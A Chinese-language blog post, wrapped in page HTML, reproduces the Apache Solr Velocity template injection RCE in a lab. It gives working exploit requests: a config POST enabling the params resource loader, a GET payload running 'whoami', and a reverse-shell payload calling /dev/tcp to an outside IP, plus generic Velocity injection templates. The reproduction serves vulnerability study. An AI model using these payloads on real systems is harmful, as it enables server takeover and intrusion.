@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言Apache Solr Velocity模板注入RCE漏洞复现 Apache Solr介绍Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。漏洞描述Solr中存在VelocityResponseWrit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr Velocity模板注入RCE漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2019/11/24/Apache-Solr-Velocity模板注入RCE漏洞复现/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言Apache Solr Velocity模板注入RCE漏洞复现 Apache Solr介绍Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。漏洞描述Solr中存在VelocityResponseWrit">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_8.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_Velocity_1.png">
+<meta property="og:updated_time" content="2019-11-24T14:50:17.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Solr Velocity模板注入RCE漏洞复现">
+<meta name="twitter:description" content="前言Apache Solr Velocity模板注入RCE漏洞复现 Apache Solr介绍Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。漏洞描述Solr中存在VelocityResponseWrit">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/24/Apache-Solr-Velocity模板注入RCE漏洞复现/">
+
+
+
+
+
+  <title>Apache Solr Velocity模板注入RCE漏洞复现 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/24/Apache-Solr-Velocity模板注入RCE漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Solr Velocity模板注入RCE漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-24T22:48:58+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java-web/" itemprop="url" rel="index">
+                    <span itemprop="name">java-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Apache Solr Velocity模板注入RCE漏洞复现</p>
+<h5 id="Apache-Solr介绍"><a href="#Apache-Solr介绍" class="headerlink" title="Apache Solr介绍"></a>Apache Solr介绍</h5><h6 id="Solr是一个独立的企业级搜索应用服务器-它对外提供类似于web-service的API接口-用户可以通过http请求-向搜索引擎服务器提交一定格式的XML文件-生成索引-也可以通过http-get操作提出查找请求-并得到XML格式的返回结果。"><a href="#Solr是一个独立的企业级搜索应用服务器-它对外提供类似于web-service的API接口-用户可以通过http请求-向搜索引擎服务器提交一定格式的XML文件-生成索引-也可以通过http-get操作提出查找请求-并得到XML格式的返回结果。" class="headerlink" title="Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。"></a>Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。</h6><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><h6 id="Solr中存在VelocityResponseWriter组件-攻击者可以构造特定请求修改相关配置-使VelocityResponseWriter组件允许加载指定模板-进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。"><a href="#Solr中存在VelocityResponseWriter组件-攻击者可以构造特定请求修改相关配置-使VelocityResponseWriter组件允许加载指定模板-进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。" class="headerlink" title="Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。"></a>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</h6><h5 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因:"></a>漏洞产生原因:</h5><h6 id="当攻击者可以直接访问Solr控制台时，可以通过发送类似-节点名-config的POST请求对该节点的配置文件做更改Apache-Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params-resource-loader-enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params-resource-loader-enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。"><a href="#当攻击者可以直接访问Solr控制台时，可以通过发送类似-节点名-config的POST请求对该节点的配置文件做更改Apache-Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params-resource-loader-enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params-resource-loader-enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。" class="headerlink" title="当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。"></a>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</h6><h5 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h5><h6 id="Apache-Solr-5-x-8-2-0，存在config-API版本"><a href="#Apache-Solr-5-x-8-2-0，存在config-API版本" class="headerlink" title="Apache Solr 5.x - 8.2.0，存在config API版本"></a>Apache Solr 5.x - 8.2.0，存在config API版本</h6><h5 id="漏洞环境的搭建"><a href="#漏洞环境的搭建" class="headerlink" title="漏洞环境的搭建"></a>漏洞环境的搭建</h5><h6 id="1-安装java环境"><a href="#1-安装java环境" class="headerlink" title="1. 安装java环境"></a>1. 安装java环境</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_1.png" alt></p>
+<h6 id="2-下载Apache-Solr-8-2-0-下载地址-https-www-apache-org-dyn-closer-lua-lucene-solr-8-2-0-solr-8-2-0-zip"><a href="#2-下载Apache-Solr-8-2-0-下载地址-https-www-apache-org-dyn-closer-lua-lucene-solr-8-2-0-solr-8-2-0-zip" class="headerlink" title="2. 下载Apache Solr 8.2.0,下载地址: https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip"></a>2. 下载Apache Solr 8.2.0,下载地址: <a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank" rel="noopener">https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip</a></h6><h6 id="3-解压然后进入bin目录执行solr-cmd-start"><a href="#3-解压然后进入bin目录执行solr-cmd-start" class="headerlink" title="3. 解压然后进入bin目录执行solr.cmd start"></a>3. 解压然后进入bin目录执行solr.cmd start</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_2.png" alt></p>
+<h6 id="4-浏览器访问192-168-10-171-8983，环境搭建成功"><a href="#4-浏览器访问192-168-10-171-8983，环境搭建成功" class="headerlink" title="4. 浏览器访问192.168.10.171:8983，环境搭建成功"></a>4. 浏览器访问192.168.10.171:8983，环境搭建成功</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_3.png" alt></p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><h6 id="1-重新启动-再次访问192-168-10-171-8983-solr发现没有创建core-先手动在-server-solr-目录下创建一个test的文件夹，然后将-server-solr-configsets-default-下的conf目录拷贝到test目录下"><a href="#1-重新启动-再次访问192-168-10-171-8983-solr发现没有创建core-先手动在-server-solr-目录下创建一个test的文件夹，然后将-server-solr-configsets-default-下的conf目录拷贝到test目录下" class="headerlink" title="1. 重新启动,再次访问192.168.10.171:8983/solr发现没有创建core, 先手动在/server/solr/目录下创建一个test的文件夹，然后将/server/solr/configsets/_default/下的conf目录拷贝到test目录下"></a>1. 重新启动,再次访问192.168.10.171:8983/solr发现没有创建core, 先手动在/server/solr/目录下创建一个test的文件夹，然后将/server/solr/configsets/_default/下的conf目录拷贝到test目录下</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_5.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_4.png" alt></p>
+<h6 id="2-然后按照下图所示创建一个名为test的core"><a href="#2-然后按照下图所示创建一个名为test的core" class="headerlink" title="2. 然后按照下图所示创建一个名为test的core"></a>2. 然后按照下图所示创建一个名为test的core</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_9.png" alt></p>
+<h6 id="3-然后访问查看该应用config文件是否可以访问"><a href="#3-然后访问查看该应用config文件是否可以访问" class="headerlink" title="3. 然后访问查看该应用config文件是否可以访问"></a>3. 然后访问查看该应用config文件是否可以访问</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_6.png" alt></p>
+<h6 id="4-Apache-Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params-resource-loader-enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。"><a href="#4-Apache-Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params-resource-loader-enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。" class="headerlink" title="4. Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。"></a>4. Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_7.png" alt></p>
+<h6 id="5-接下来我们就可以构造payload来实现RCE"><a href="#5-接下来我们就可以构造payload来实现RCE" class="headerlink" title="5. 接下来我们就可以构造payload来实现RCE"></a>5. 接下来我们就可以构造payload来实现RCE</h6><h6 id="Payload如下："><a href="#Payload如下：" class="headerlink" title="Payload如下："></a>Payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_8.PNG" alt></p>
+<h6 id="下面是执行得到shell的payload-Burp-Suite"><a href="#下面是执行得到shell的payload-Burp-Suite" class="headerlink" title="下面是执行得到shell的payload(Burp Suite)"></a>下面是执行得到shell的payload(Burp Suite)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: 192.168.1.100:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 261</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="下面直接反弹shell到你自己的服务器上"><a href="#下面直接反弹shell到你自己的服务器上" class="headerlink" title="下面直接反弹shell到你自己的服务器上"></a>下面直接反弹shell到你自己的服务器上</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20-c%20%22bash%20-i%20&gt;/dev/tcp/123.57.232.69/8080%200&gt;%261%22%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: 192.168.1.100:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<h6 id="复现完成之后我们了解了相关的模板注入："><a href="#复现完成之后我们了解了相关的模板注入：" class="headerlink" title="复现完成之后我们了解了相关的模板注入："></a>复现完成之后我们了解了相关的模板注入：</h6><h6 id="Velocity是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp-Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。"><a href="#Velocity是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp-Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。" class="headerlink" title="Velocity是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。"></a><a href="https://velocity.apache.org/" target="_blank" rel="noopener">Velocity</a>是另一种流行的Java模板语言，使用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的功能，也没有明显的默认变量列表。以下屏幕截图显示了用于强制变量名称的Burp Intruder工具，其中变量名称位于“payload”列的左侧，服务器的输出位于右侧。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/Apache_Solr_Velocity_1.png" alt></p>
+<h6 id="在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到https-velocity-apache-org-tools-releases-2-0-summary-html："><a href="#在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到https-velocity-apache-org-tools-releases-2-0-summary-html：" class="headerlink" title="在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到https://velocity.apache.org/tools/releases/2.0/summary.html："></a>在类，因为它返回一个通用对象变量（高亮）看起来特别有前途。谷歌搜索引导我们到<a href="https://velocity.apache.org/tools/releases/2.0/summary.html：" target="_blank" rel="noopener">https://velocity.apache.org/tools/releases/2.0/summary.html：</a></h6><h6 id="ClassTool：用于在模板中使用Java反射的工具"><a href="#ClassTool：用于在模板中使用Java反射的工具" class="headerlink" title="ClassTool：用于在模板中使用Java反射的工具"></a>ClassTool：用于在模板中使用Java反射的工具</h6><h6 id="默认键：-class"><a href="#默认键：-class" class="headerlink" title="默认键：$ class"></a>默认键：$ class</h6><h6 id="一种方法和一种属性脱颖而出："><a href="#一种方法和一种属性脱颖而出：" class="headerlink" title="一种方法和一种属性脱颖而出："></a>一种方法和一种属性脱颖而出：</h6><h6 id="class-inspect-类-对象-串-返回一个检查指定类或对象的新ClassTool实例"><a href="#class-inspect-类-对象-串-返回一个检查指定类或对象的新ClassTool实例" class="headerlink" title="$ class.inspect(类/对象/串)返回一个检查指定类或对象的新ClassTool实例"></a>$ class.inspect(类/对象/串)返回一个检查指定类或对象的新ClassTool实例</h6><h6 id="class-type返回正在检查的实际类"><a href="#class-type返回正在检查的实际类" class="headerlink" title="$ class.type返回正在检查的实际类"></a>$ class.type返回正在检查的实际类</h6><h6 id="https-velocity-apache-org-tools-releases-2-0-summary-html"><a href="#https-velocity-apache-org-tools-releases-2-0-summary-html" class="headerlink" title="https://velocity.apache.org/tools/releases/2.0/summary.html"></a><a href="https://velocity.apache.org/tools/releases/2.0/summary.html" target="_blank" rel="noopener">https://velocity.apache.org/tools/releases/2.0/summary.html</a></h6><h6 id="换句话说，我们可以使用-class-type-链接-class-inspect以获取对任意对象的引用。然后，我们可以使用Runtime-exec-在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。"><a href="#换句话说，我们可以使用-class-type-链接-class-inspect以获取对任意对象的引用。然后，我们可以使用Runtime-exec-在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。" class="headerlink" title="换句话说，我们可以使用$ class.type 链接`$ class.inspect以获取对任意对象的引用。然后，我们可以使用Runtime.exec()在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。"></a>换句话说，我们可以使用$ class.type 链接`$ class.inspect以获取对任意对象的引用。然后，我们可以使用Runtime.exec()在目标系统上执行任意shell命令。这可以使用以下模板进行确认，该模板旨在导致明显的时间延迟。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor()</span><br><span class="line"></span><br><span class="line">[5 second time delay] </span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<h6 id="获取shell命令的输出有点棘手-毕竟这是Java"><a href="#获取shell命令的输出有点棘手-毕竟这是Java" class="headerlink" title="获取shell命令的输出有点棘手(毕竟这是Java):"></a>获取shell命令的输出有点棘手(毕竟这是Java):</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line"></span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line"></span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line"></span><br><span class="line">$ex.waitFor()</span><br><span class="line"></span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line"></span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line"></span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line"></span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tomcat7</span><br></pre></td></tr></table></figure>
+
